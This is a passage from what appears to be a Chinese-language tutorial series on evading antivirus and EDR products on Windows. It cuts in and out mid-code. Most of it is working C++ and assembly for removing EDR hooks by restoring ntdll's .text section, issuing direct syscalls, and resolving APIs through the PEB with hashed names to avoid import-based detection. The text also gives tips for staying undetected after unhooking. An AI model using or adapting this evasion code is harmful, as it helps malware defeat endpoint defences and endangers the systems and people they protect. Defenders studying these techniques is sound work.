&amp;oldProtect)) &#123;<br>                <span class="hljs-comment">// 5. 用干净的节覆盖</span><br>                <span class="hljs-built_in">memcpy</span>(pDest, pSrc, section-&gt;Misc.VirtualSize);<br><br>                <span class="hljs-comment">// 6. 恢复原始保护</span><br>                <span class="hljs-built_in">VirtualProtect</span>(pDest, section-&gt;Misc.VirtualSize, oldProtect, &amp;oldProtect);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">UnmapViewOfFile</span>(cleanNtdll);<br>    <span class="hljs-built_in">CloseHandle</span>(hMapping);<br>    <span class="hljs-built_in">CloseHandle</span>(hFile);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="2-6-3-–-为什么这种方法有效"><a href="#2-6-3-–-为什么这种方法有效" class="headerlink" title="2.6.3 – 为什么这种方法有效"></a><strong>2.6.3 – 为什么这种方法有效</strong></h3><ul>
<li><p>EDR通过修改<code>ntdll.dll</code>中函数的前几个字节来插入钩取（内联钩取），将它们替换为JMP指令或跳板。</p>
</li>
<li><p>通过从磁盘恢复<code>.text</code>节，我们完全移除这些钩取，因为我们用原始代码覆盖了修改过的代码。</p>
</li>
<li><p>我们不会触及导入表或内存布局，因此可以避免被完整性检查或AV检测。</p>
</li>
</ul>
<hr>
<h3 id="2-6-4-–-使用此技术的实际工具"><a href="#2-6-4-–-使用此技术的实际工具" class="headerlink" title="2.6.4 – 使用此技术的实际工具"></a><strong>2.6.4 – 使用此技术的实际工具</strong></h3><ul>
<li><p><strong>Mimikatz（高级版本）</strong></p>
</li>
<li><p><strong>Cobalt Strike Beacon</strong></p>
</li>
<li><p><strong>BOF加载器中的卸载阶段</strong></p>
</li>
<li><p><strong>红队战术</strong> 通常在使用本地API或手动系统调用存根之前进行<code>ntdll</code>卸载</p>
</li>
</ul>
<hr>
<h3 id="2-6-5-–-检测考虑事项"><a href="#2-6-5-–-检测考虑事项" class="headerlink" title="2.6.5 – 检测考虑事项"></a><strong>2.6.5 – 检测考虑事项</strong></h3><p>尽管这种技术绕过了<strong>用户模式检测</strong>，但内核模式EDR仍然能够：</p>
<ul>
<li><p>监控被修改的内存页（例如，<code>.text</code>节）。</p>
</li>
<li><p>钩取SSDT或内核回调（如果没有通过直接系统调用来绕过）。</p>
</li>
<li><p>当预期的钩取被移除时发出警报。</p>
</li>
</ul>
<p>为了应对这种情况：</p>
<ul>
<li><p>将**<code>ntdll</code>卸载<strong>与</strong>直接系统调用存根**配合使用。</p>
</li>
<li><p>避免行为上显得可疑的活动（例如，在卸载后立即注入远程进程）。</p>
</li>
</ul>
<hr>
<h3 id="2-6-6-–-总结"><a href="#2-6-6-–-总结" class="headerlink" title="2.6.6 – 总结"></a><strong>2.6.6 – 总结</strong></h3><table>
<thead>
<tr>
<th>特性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>目标</strong></td>
<td>移除<code>ntdll.dll</code>中的内联EDR钩取</td>
</tr>
<tr>
<td><strong>目标区域</strong></td>
<td><code>.text</code>节（函数操作码所在位置）</td>
</tr>
<tr>
<td><strong>方法</strong></td>
<td>从磁盘加载干净的<code>ntdll.dll</code>并覆盖内存中的节</td>
</tr>
<tr>
<td><strong>规避级别</strong></td>
<td>仅限用户模式（内核EDR仍然是威胁）</td>
</tr>
<tr>
<td><strong>用途</strong></td>
<td>在内存注入、系统调用使用等操作前的初始阶段</td>
</tr>
</tbody></table>
<hr>
<h2 id="AV-EDR规避实战技术-2-7-直接和间接系统调用规避"><a href="#AV-EDR规避实战技术-2-7-直接和间接系统调用规避" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 2.7 - 直接和间接系统调用规避"></a><strong>AV&#x2F;EDR规避实战技术 - 2.7 - 直接和间接系统调用规避</strong></h2><p>现代的AV和EDR主要依赖于<strong>用户模式钩取</strong>来监控潜在的恶意行为。这些钩取通常会放置在<code>ntdll.dll</code>中——该DLL包含用于从用户模式调用内核功能的系统调用存根。</p>
<p>通过绕过<code>ntdll.dll</code>并直接从汇编中调用系统调用，恶意软件可以<strong>避免被检测</strong>，因为EDR失去了对API链的可见性。</p>
<hr>
<h3 id="2-7-2-–-直接系统调用示例：NtAllocateVirtualMemory"><a href="#2-7-2-–-直接系统调用示例：NtAllocateVirtualMemory" class="headerlink" title="2.7.2 – 直接系统调用示例：NtAllocateVirtualMemory"></a><strong>2.7.2 – 直接系统调用示例：NtAllocateVirtualMemory</strong></h3><p>以下示例展示了如何使用内联汇编手动调用<code>NtAllocateVirtualMemory</code>：</p>
<h4 id="syscalls-asm"><a href="#syscalls-asm" class="headerlink" title="syscalls.asm"></a><strong>syscalls.asm</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asm">.code<br><br>NtAllocateVirtualMemory PROC<br>    mov r10, rcx                    ; 系统调用约定：r10 = RCX<br>    mov eax, 0x18                   ; NtAllocateVirtualMemory的系统调用号（Windows 10 x64）<br>    syscall                         ; 进入内核模式<br>    ret<br>NtAllocateVirtualMemory ENDP<br><br>END<br></code></pre></td></tr></table></figure>

<p>注意：系统调用ID（<code>0x18</code>）可能会随着Windows版本的不同而变化，必须动态解析正确的系统调用号或根据构建解析。</p>
<hr>
<h4 id="syscalls-h"><a href="#syscalls-h" class="headerlink" title="syscalls.h"></a><strong>syscalls.h</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">NTSTATUS <span class="hljs-title">NtAllocateVirtualMemory</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID* BaseAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG_PTR ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">    PSIZE_T RegionSize,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG AllocationType,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG Protect</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a><strong>main.cpp</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;syscalls.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    PVOID baseAddress = <span class="hljs-literal">nullptr</span>;<br>    SIZE_T regionSize = <span class="hljs-number">0x1000</span>; <span class="hljs-comment">// 4 KB</span><br>    NTSTATUS status = <span class="hljs-built_in">NtAllocateVirtualMemory</span>(<br>        <span class="hljs-built_in">GetCurrentProcess</span>(),<br>        &amp;baseAddress,<br>        <span class="hljs-number">0</span>,<br>        &amp;regionSize,<br>        MEM_COMMIT | MEM_RESERVE,<br>        PAGE_READWRITE<br>    );<br><br>    <span class="hljs-keyword">if</span> (status == <span class="hljs-number">0</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[+] Memory allocated at &quot;</span> &lt;&lt; baseAddress &lt;&lt; std::endl;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[-] Syscall failed: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>用MASM（ML64）编译并将其与C++文件链接。</p>
<hr>
<h3 id="2-7-3-–-间接系统调用（syswhispers和syswhispers2）"><a href="#2-7-3-–-间接系统调用（syswhispers和syswhispers2）" class="headerlink" title="2.7.3 – 间接系统调用（syswhispers和syswhispers2）"></a><strong>2.7.3 – 间接系统调用（syswhispers和syswhispers2）</strong></h3><p><strong>间接系统调用</strong>使用动态生成的系统调用存根，并通过它们从C&#x2F;C++跳转，而不会暴露可疑的静态字符串或硬编码的系统调用号。这提供了额外的混淆，非常适合红队工具。</p>
<p><strong>工具：</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a> – 生成带有随机名称和系统调用存根的头文件和汇编文件。</li>
</ul>
<hr>
<p> <strong>为什么使用间接系统调用而不是直接系统调用？</strong></p>
<table>
<thead>
<tr>
<th>直接</th>
<th>间接</th>
</tr>
</thead>
<tbody><tr>
<td>硬编码系统调用ID</td>
<td>动态解析</td>
</tr>
<tr>
<td>如果静态，容易被检测</td>
<td>更隐蔽</td>
</tr>
<tr>
<td>没有抽象</td>
<td>随机化的存根名称和调用</td>
</tr>
<tr>
<td>开销最小</td>
<td>支持现代EDR规避</td>
</tr>
</tbody></table>
<hr>
<h3 id="2-7-4-–-实际使用与案例分析"><a href="#2-7-4-–-实际使用与案例分析" class="headerlink" title="2.7.4 – 实际使用与案例分析"></a><strong>2.7.4 – 实际使用与案例分析</strong></h3><ul>
<li><p><strong>Cobalt Strike BOF</strong>：使用系统调用避免EDR的用户模式可见性。</p>
</li>
<li><p><strong>SliverC2</strong>：通过BOF或自定义加载器启用系统调用功能。</p>
</li>
<li><p><strong>Shellcode加载器</strong>：经常使用系统调用而不是<code>VirtualAlloc</code>、<code>CreateThread</code>来避开<code>ntdll</code>钩取。</p>
</li>
</ul>
<hr>
<h3 id="2-7-5-–-检测限制与风险"><a href="#2-7-5-–-检测限制与风险" class="headerlink" title="2.7.5 – 检测限制与风险"></a><strong>2.7.5 – 检测限制与风险</strong></h3><ul>
<li><p>配备<strong>内核回调</strong>（ObCallbacks，PsCallbacks）的EDR仍然可以检测到系统调用执行<strong>之后</strong>发生的事情（例如，内存写入或线程创建）。</p>
</li>
<li><p>现代解决方案会检查内存布局（例如，系统调用存根地址不在<code>ntdll.dll</code>中）或进行<strong>栈检查</strong>来检测异常。</p>
</li>
<li><p>系统调用号在<strong>Windows版本</strong>之间有所不同，使硬编码ID不可靠。</p>
</li>
</ul>
<hr>
<h3 id="2-7-6-–-总结表"><a href="#2-7-6-–-总结表" class="headerlink" title="2.7.6 – 总结表"></a><strong>2.7.6 – 总结表</strong></h3><table>
<thead>
<tr>
<th>技术</th>
<th>优点</th>
<th>风险</th>
</tr>
</thead>
<tbody><tr>
<td>直接系统调用</td>
<td>完全绕过用户模式钩取</td>
<td>硬编码系统调用号，特定版本</td>
</tr>
<tr>
<td>间接系统调用</td>
<td>混淆 + 用户模式规避</td>
<td>可能因RWX内存或Shellcode而被标记</td>
</tr>
<tr>
<td>工具</td>
<td>SysWhispers2，Hell’s Gate</td>
<td>可能因熵或反射加载而触发</td>
</tr>
</tbody></table>
<h1 id="模块-3-–-Windows-内核及规避-API"><a href="#模块-3-–-Windows-内核及规避-API" class="headerlink" title="模块 3 – Windows 内核及规避 API"></a>模块 3 – Windows 内核及规避 API</h1><h2 id="AV-EDR规避实战技术-3-1-理解Windows子系统与API层"><a href="#AV-EDR规避实战技术-3-1-理解Windows子系统与API层" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 3.1 - 理解Windows子系统与API层"></a><strong>AV&#x2F;EDR规避实战技术 - 3.1 - 理解Windows子系统与API层</strong></h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h4><p>要理解恶意软件如何规避AV&#x2F;EDR系统，首先必须了解应用程序如何通过分层API与Windows交互。这些知识使攻击者能够通过使用较少监控或未记录的路径绕过用户模式钩取并规避检测。</p>
<hr>
<h3 id="Windows中的执行层"><a href="#Windows中的执行层" class="headerlink" title="Windows中的执行层"></a><strong>Windows中的执行层</strong></h3><ol>
<li><p><strong>应用程序代码（C&#x2F;C++&#x2F;汇编）</strong></p>
</li>
<li><p><strong>高级Win32 API（例如，<code>CreateProcess</code>、<code>VirtualAlloc</code>、<code>WriteFile</code>）</strong></p>
</li>
<li><p><strong>NTDLL.dll（原生API，例如，<code>NtCreateFile</code>、<code>NtAllocateVirtualMemory</code>）</strong></p>
</li>
<li><p><strong>系统调用接口（<code>syscall</code>、<code>sysenter</code>、<code>int 0x2e</code>）</strong></p>
</li>
<li><p><strong>内核模式执行（<code>ntoskrnl.exe</code>，内核驱动程序）</strong></p>
</li>
</ol>
<hr>
<h3 id="示例：分层调用内存分配"><a href="#示例：分层调用内存分配" class="headerlink" title="示例：分层调用内存分配"></a><strong>示例：分层调用内存分配</strong></h3><h4 id="Win32-API层"><a href="#Win32-API层" class="headerlink" title="Win32 API层"></a><strong>Win32 API层</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 这是高层的、广为人知并且被严重监控的调用</span><br>LPVOID buffer = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">4096</span>, MEM_COMMIT, PAGE_READWRITE);<br></code></pre></td></tr></table></figure>

<h4 id="NTDLL层"><a href="#NTDLL层" class="headerlink" title="NTDLL层"></a><strong>NTDLL层</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 更隐蔽，但仍可能被EDR在用户模式下钩取</span><br>NTSTATUS status = <span class="hljs-built_in">NtAllocateVirtualMemory</span>(<br>    <span class="hljs-built_in">GetCurrentProcess</span>(),<br>    &amp;buffer,<br>    <span class="hljs-number">0</span>,<br>    &amp;regionSize,<br>    MEM_COMMIT | MEM_RESERVE,<br>    PAGE_READWRITE<br>);<br></code></pre></td></tr></table></figure>

<h4 id="直接系统调用层（高级）"><a href="#直接系统调用层（高级）" class="headerlink" title="直接系统调用层（高级）"></a><strong>直接系统调用层（高级）</strong></h4><p>在这里，直接执行<code>syscall</code>指令，绕过用户模式钩取。需要对系统调用号和正确的存根有一定的了解。现代APT（高级持续威胁）经常使用这种方法。</p>
<hr>
<h3 id="为什么EDR监控较高层次的API"><a href="#为什么EDR监控较高层次的API" class="headerlink" title="为什么EDR监控较高层次的API"></a><strong>为什么EDR监控较高层次的API</strong></h3><ul>
<li><p>函数如<code>CreateRemoteThread</code>、<code>VirtualProtect</code>、<code>WriteProcessMemory</code>等通常会被认为是恶意行为的<strong>高信号</strong>。</p>
</li>
<li><p>EDR会在<strong>用户模式</strong>下钩取这些函数，以监控内存注入、进程创建等行为。</p>
</li>
<li><p>这些API最终会调用<strong>ntdll.dll</strong>，该DLL发出系统调用以进入<strong>内核模式</strong>。</p>
</li>
</ul>
<hr>
<h3 id="钩取说明"><a href="#钩取说明" class="headerlink" title="钩取说明"></a><strong>钩取说明</strong></h3><p><strong>示例：<code>VirtualAlloc</code>被EDR钩取</strong></p>
<ul>
<li><p>当调用<code>VirtualAlloc</code>时，EDR的DLL可能已经替换了它的函数前导代码，使得控制跳转到监控代码。</p>
</li>
<li><p>恶意软件通过直接调用<code>NtAllocateVirtualMemory</code>或构造<strong>系统调用存根</strong>来规避这种钩取。</p>
</li>
</ul>
<hr>
<h3 id="直接调用原生API示例（绕过钩取API）"><a href="#直接调用原生API示例（绕过钩取API）" class="headerlink" title="直接调用原生API示例（绕过钩取API）"></a><strong>直接调用原生API示例（绕过钩取API）</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI *pNtAllocVM)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    HANDLE,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID*,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG_PTR,</span></span><br><span class="hljs-params"><span class="hljs-function">    PSIZE_T,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    HMODULE hNtdll = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    pNtAllocVM NtAllocateVirtualMemory = (pNtAllocVM)<span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;NtAllocateVirtualMemory&quot;</span>);<br><br>    PVOID buffer = <span class="hljs-literal">NULL</span>;<br>    SIZE_T size = <span class="hljs-number">4096</span>;<br><br>    NTSTATUS status = <span class="hljs-built_in">NtAllocateVirtualMemory</span>(<br>        <span class="hljs-built_in">GetCurrentProcess</span>(),<br>        &amp;buffer,<br>        <span class="hljs-number">0</span>,<br>        &amp;size,<br>        MEM_COMMIT | MEM_RESERVE,<br>        PAGE_EXECUTE_READWRITE<br>    );<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">NT_SUCCESS</span>(status)) &#123;<br>        <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;Memory allocated&quot;</span>, <span class="hljs-string">&quot;Success&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>为什么它能规避：</strong> 这个方法避免了<code>VirtualAlloc</code>，后者通常会被钩取。然而，一些EDR现在甚至会钩取<code>ntdll.dll</code>的导出函数。这就需要使用<strong>系统调用存根</strong>或<strong>ntdll卸载</strong>（在第7模块中讨论）。</p>
<hr>
<h3 id="真实世界恶意软件示例：Cobalt-Strike"><a href="#真实世界恶意软件示例：Cobalt-Strike" class="headerlink" title="真实世界恶意软件示例：Cobalt Strike"></a><strong>真实世界恶意软件示例：Cobalt Strike</strong></h3><ul>
<li><p>Cobalt Strike的Beacon使用<strong>反射加载</strong>。</p>
</li>
<li><p>它<strong>不直接导入Win32 API</strong>，以避免静态检测。</p>
</li>
<li><p>所有API调用都通过<strong>PEB遍历</strong>和<strong>手动EAT解析</strong>来解决。</p>
</li>
<li><p>它更倾向于使用<strong>系统调用</strong>或<strong>原生API</strong>，从不直接调用<code>CreateRemoteThread</code>。</p>
</li>
</ul>
<hr>
<h3 id="检测点和影响"><a href="#检测点和影响" class="headerlink" title="检测点和影响"></a><strong>检测点和影响</strong></h3><table>
<thead>
<tr>
<th>层级</th>
<th>监控工具</th>
<th>绕过策略</th>
</tr>
</thead>
<tbody><tr>
<td>Win32 API</td>
<td>AV&#x2F;EDR钩取</td>
<td>使用原生API（ntdll.dll）</td>
</tr>
<tr>
<td>NTDLL导出</td>
<td>用户模式API钩取</td>
<td>卸载ntdll.dll，使用直接系统调用</td>
</tr>
<tr>
<td>系统调用接口</td>
<td>内核EDR驱动</td>
<td>随机化存根，使用间接系统调用</td>
</tr>
<tr>
<td>内核模式</td>
<td>内核回调</td>
<td>内核漏洞或ETW绕过</td>
</tr>
</tbody></table>
<hr>
<h3 id="AV-EDR监控的关键API"><a href="#AV-EDR监控的关键API" class="headerlink" title="AV&#x2F;EDR监控的关键API"></a><strong>AV&#x2F;EDR监控的关键API</strong></h3><table>
<thead>
<tr>
<th>API</th>
<th>目的</th>
<th>恶意软件的常见用途</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAlloc&#x2F;Ex</td>
<td>分配内存</td>
<td>有效载荷注入</td>
</tr>
<tr>
<td>WriteProcessMemory</td>
<td>写入另一个进程的内存</td>
<td>进程注入</td>
</tr>
<tr>
<td>CreateRemoteThreadEx</td>
<td>执行远程shellcode</td>
<td>在目标进程中执行代码</td>
</tr>
<tr>
<td>SetThreadContext</td>
<td>劫持线程执行</td>
<td>线程劫持</td>
</tr>
<tr>
<td>Nt*等同函数</td>
<td>原生API替代</td>
<td>绕过钩取&#x2F;隐蔽操作</td>
</tr>
</tbody></table>
<hr>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a><strong>结论</strong></h3><p>理解这些API层级及其与Windows内部机制的交互是<strong>AV&#x2F;EDR规避</strong>的基础。它使恶意软件能够：</p>
<ul>
<li><p>避免监控的函数</p>
</li>
<li><p>隐藏意图，防止静态分析</p>
</li>
<li><p>创建低噪声有效载荷，供红队和攻击工具使用</p>
</li>
</ul>
<p>在未来的模块（模块8）中，我们将回顾这一点，并讨论<strong>直接系统调用生成</strong>、<strong>间接系统调用</strong>以及<strong>ETW&#x2F;AMSI绕过</strong>。</p>
<hr>
<h2 id="AV-EDR规避实战技术-3-2-探索PEB和TEB进行API解析和混淆"><a href="#AV-EDR规避实战技术-3-2-探索PEB和TEB进行API解析和混淆" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 3.2 - 探索PEB和TEB进行API解析和混淆"></a><strong>AV&#x2F;EDR规避实战技术 - 3.2 - 探索PEB和TEB进行API解析和混淆</strong></h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>为了规避AV&#x2F;EDR检测，现代恶意软件通常避免通过导入地址表（IAT）直接导入敏感API。相反，它手动解析<strong>PEB（进程环境块）</strong>和<strong>TEB（线程环境块）</strong>，动态定位模块并解析API地址。这样可以绕过静态检测，避免可疑的导入，并减少对常被钩取API（如<code>GetProcAddress</code>和<code>LoadLibrary</code>）的依赖。</p>
<hr>
<h3 id="为什么使用PEB进行API解析？"><a href="#为什么使用PEB进行API解析？" class="headerlink" title="为什么使用PEB进行API解析？"></a><strong>为什么使用PEB进行API解析？</strong></h3><ul>
<li><p><strong>绕过IAT导入</strong>，使静态分析变得更加困难。</p>
</li>
<li><p>**避免使用<code>GetProcAddress</code>**，后者经常被EDR监控。</p>
</li>
<li><p><strong>运行时隐蔽解析API地址</strong>。</p>
</li>
<li><p><strong>真实世界的恶意软件</strong>如<strong>Cobalt Strike</strong>、<strong>Sliver</strong>、<strong>Empire</strong>使用这种技术。</p>
</li>
</ul>
<hr>
<h3 id="结构概述"><a href="#结构概述" class="headerlink" title="结构概述"></a><strong>结构概述</strong></h3><ul>
<li><p><strong>TEB</strong>指向<strong>PEB</strong>。</p>
</li>
<li><p><strong>PEB</strong>包含指向已加载模块列表的指针。</p>
</li>
<li><p>可以通过<code>fs:[0x30]</code>（x86）或<code>gs:[0x60]</code>（x64）访问这些模块。</p>
</li>
</ul>
<hr>
<h3 id="代码：通过PEB动态解析API（x64）"><a href="#代码：通过PEB动态解析API（x64）" class="headerlink" title="代码：通过PEB动态解析API（x64）"></a><strong>代码：通过PEB动态解析API（x64）</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* tGetProcAddress)</span><span class="hljs-params">(HMODULE, LPCSTR)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* tLoadLibraryA)</span><span class="hljs-params">(LPCSTR)</span></span>;<br><br><span class="hljs-comment">// 用于函数名混淆的哈希函数</span><br><span class="hljs-function">DWORD <span class="hljs-title">HashFunction</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name)</span> </span>&#123;<br>    DWORD hash = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (*name) &#123;<br>        hash = ((hash &lt;&lt; <span class="hljs-number">5</span>) + hash) + *name++; <span class="hljs-comment">// djb2哈希</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> hash;<br>&#125;<br><br><span class="hljs-function">FARPROC <span class="hljs-title">GetFunctionAddressByPEB</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* libName, DWORD functionHash)</span> </span>&#123;<br>    PPEB peb = (PPEB)__readgsqword(<span class="hljs-number">0x60</span>); <span class="hljs-comment">// 访问PEB</span><br>    PPEB_LDR_DATA ldr = peb-&gt;Ldr;<br><br>    <span class="hljs-keyword">for</span> (PLIST_ENTRY list = ldr-&gt;InMemoryOrderModuleList.Flink;<br>        list != &amp;ldr-&gt;InMemoryOrderModuleList;<br>        list = list-&gt;Flink) &#123;<br><br>        PLDR_DATA_TABLE_ENTRY entry = <span class="hljs-built_in">CONTAINING_RECORD</span>(list, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);<br><br>        <span class="hljs-type">char</span> baseName[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>        <span class="hljs-type">int</span> len = <span class="hljs-built_in">WideCharToMultiByte</span>(CP_ACP, <span class="hljs-number">0</span>, entry-&gt;BaseDllName.Buffer, entry-&gt;BaseDllName.Length / <span class="hljs-built_in">sizeof</span>(WCHAR),<br>            baseName, MAX_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>        <span class="hljs-keyword">if</span> (_stricmp(baseName, libName) == <span 